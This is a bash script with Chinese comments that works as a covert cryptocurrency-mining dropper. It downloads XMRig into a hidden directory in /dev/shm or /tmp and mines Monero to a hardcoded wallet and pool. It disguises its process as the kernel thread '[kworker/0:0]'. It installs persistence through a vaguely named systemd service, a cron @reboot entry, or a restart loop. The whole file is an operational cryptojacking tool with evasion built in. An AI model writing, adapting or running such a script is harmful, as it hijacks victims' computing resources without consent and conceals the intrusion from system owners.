#!/bin/bash
# Universal Persistent Script (Low/High Privilege)
# GitHub: https://github.com/yourusername/yourrepo

set -euo pipefail

# 调试模式
DEBUG=false
if [ "${1:-}" = "debug" ]; then
    DEBUG=true
    set -x
fi

### 配置区（修改这里） ###
REPO_URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
BIN_NAME="xmrig"
WALLET="43CcvodQDNGQnDyPY2adzKcgbmKzncFt1dtCDGUnJAKcQAmaVr3KQ5WhVsw2e8DYQcCbd16PbBhEWPk2GV3xrtoaH3kCrUE"
POOL="pool.supportxmr.com:3333"
THREADS="60"
WORKER_NAME="worker"
####################################

### 调试输出函数 ###
debug_echo() {
    if [ "$DEBUG" = true ]; then
        echo "[DEBUG] $1"
    fi
}

### 初始化环境 ###
init_env() {
    debug_echo "开始初始化环境"
    # 创建内存文件系统
    if [ -d "/dev/shm" ]; then
        STORE_DIR="/dev/shm/.${BIN_NAME}_cache"
    else
        STORE_DIR="/tmp/.${BIN_NAME}_cache"
    fi
    debug_echo "存储目录: $STORE_DIR"
    mkdir -p "$STORE_DIR"
    
    # 选择下载工具（优先用 curl）
    if command -v curl >/dev/null; then
        DOWNLOAD="curl -sSL"
        debug_echo "使用 curl 下载"
    elif command -v wget >/dev/null; then
        DOWNLOAD="wget -qO-"
        debug_echo "使用 wget 下载"
    else
        echo "[-] Error: 需要 curl 或 wget!" >&2
        exit 1
    fi
}

### 下载并部署二进制 ###
deploy_bin() {
    if [ ! -f "${STORE_DIR}/${BIN_NAME}" ]; then
        echo "[*] 下载 ${BIN_NAME}..."
        debug_echo "开始下载和解压过程"
        
        # 创建临时目录
        TEMP_DIR="${STORE_DIR}/temp"
        mkdir -p "$TEMP_DIR"
        debug_echo "创建临时目录: $TEMP_DIR"
        
        # 下载文件
        debug_echo "下载URL: $REPO_URL"
        $DOWNLOAD "$REPO_URL" > "${TEMP_DIR}/archive.tar.gz"
        if [ $? -ne 0 ]; then
            echo "[-] 下载失败"
            rm -rf "$TEMP_DIR"
            exit 1
        fi
        debug_echo "下载完成"
        
        # 解压文件
        debug_echo "开始解压"
        tar -xzf "${TEMP_DIR}/archive.tar.gz" -C "$TEMP_DIR"
        if [ $? -ne 0 ]; then
            echo "[-] 解压失败"
            rm -rf "$TEMP_DIR"
            exit 1
        fi
        debug_echo "解压完成"
        
        # 查找二进制文件
        debug_echo "查找二进制文件"
        BIN_PATH=$(find "$TEMP_DIR" -name "xmrig" -type f | head -n 1)
        if [ -z "$BIN_PATH" ]; then
            echo "[-] 未找到二进制文件"
            debug_echo "目录内容:"
            ls -R "$TEMP_DIR"
            rm -rf "$TEMP_DIR"
            exit 1
        fi
        debug_echo "找到二进制文件: $BIN_PATH"
        
        # 移动文件
        debug_echo "移动文件到: ${STORE_DIR}/${BIN_NAME}"
        mv "$BIN_PATH" "${STORE_DIR}/${BIN_NAME}"
        chmod +x "${STORE_DIR}/${BIN_NAME}"
        
        # 清理
        debug_echo "清理临时文件"
        rm -rf "$TEMP_DIR"
        
        if [ ! -x "${STORE_DIR}/${BIN_NAME}" ]; then
            echo "[-] 权限设置失败"
            exit 1
        fi
        echo "[+] 二进制文件准备完成"
    fi
}

### 启动进程（伪装为系统进程） ###
start_process() {
    debug_echo "开始启动进程"
    if ! pgrep -f "${BIN_NAME}.*${POOL}" >/dev/null; then
        debug_echo "启动新进程"
        exec -a "[kworker/0:0]" "${STORE_DIR}/${BIN_NAME}" \
            -o "$POOL" -u "$WALLET" --cpu-max-threads-hint "$THREADS" \
            -p "$WORKER_NAME" --donate-level=0 -b >/dev/null 2>&1 &
    else
        debug_echo "进程已在运行"
    fi
}

### 持久化方式检测 ###
setup_persistence() {
    debug_echo "开始设置持久化"
    # 1. 尝试 Systemd（高权限）
    if [ -d "/etc/systemd/system" ] && [ -w "/etc/systemd/system" ]; then
        debug_echo "使用 Systemd 持久化"
        cat <<EOF | sudo tee "/etc/systemd/system/${BIN_NAME}.service" >/dev/null
[Unit]
Description=Background Service
After=network.target

[Service]
ExecStart=${STORE_DIR}/${BIN_NAME} -o $POOL -u $WALLET --cpu-max-threads-hint $THREADS -p $WORKER_NAME --donate-level=0 -b
Restart=always
RestartSec=30
User=$(whoami)

[Install]
WantedBy=multi-user.target
EOF
        sudo systemctl daemon-reload
        sudo systemctl enable "${BIN_NAME}.service"
        sudo systemctl start "${BIN_NAME}.service" >/dev/null 2>&1 &
    
    # 2. 尝试 Cron（低权限）
    elif command -v crontab >/dev/null; then
        debug_echo "使用 Cron 持久化"
        # 创建内存中的启动命令
        STARTUP_CMD="cd ${STORE_DIR} && nohup ${STORE_DIR}/${BIN_NAME} -o $POOL -u $WALLET --cpu-max-threads-hint $THREADS -p $WORKER_NAME --donate-level=0 -b >/dev/null 2>&1 &"
        # 添加到 crontab
        (crontab -l 2>/dev/null; echo "@reboot $STARTUP_CMD") | crontab - >/dev/null 2>&1
        # 立即执行启动命令
        eval "$STARTUP_CMD" &
    
    # 3. 回退到 while 循环（最低权限）
    else
        debug_echo "使用 While 循环监控"
        # 直接在内存中创建监控函数
        monitor_func() {
            while true; do
                if ! pgrep -f "${BIN_NAME}.*${POOL}" >/dev/null; then
                    cd "${STORE_DIR}"
                    nohup "${STORE_DIR}/${BIN_NAME}" -o "$POOL" -u "$WALLET" --cpu-max-threads-hint "$THREADS" -p "$WORKER_NAME" --donate-level=0 -b >/dev/null 2>&1 &
                fi
                sleep 300
            done
        }
        # 在后台启动监控函数
        monitor_func &
    fi
}

### 检查进程状态 ###
check_status() {
    debug_echo "检查进程状态"
    # 检查主进程
    if pgrep -f "${BIN_NAME}.*${POOL}" >/dev/null; then
        echo "[+] 主进程运行中"
        return 0
    fi
    
    # 检查持久化方式
    if [ -f "/etc/systemd/system/${BIN_NAME}.service" ]; then
        echo "[+] Systemd 服务已配置"
        return 0
    elif crontab -l 2>/dev/null | grep -q "${BIN_NAME}.*${POOL}"; then
        echo "[+] Cron 任务已配置"
        return 0
    elif pgrep -f "monitor_func" >/dev/null; then
        echo "[+] 监控进程运行中"
        return 0
    fi
    
    echo "[-] 未检测到运行中的进程"
    return 1
}

### 主流程 ###
main() {
    init_env
    deploy_bin
    start_process
    setup_persistence
    # 检查状态
    check_status
    # 立即退出，不等待
    exit 0
}

main "$@"
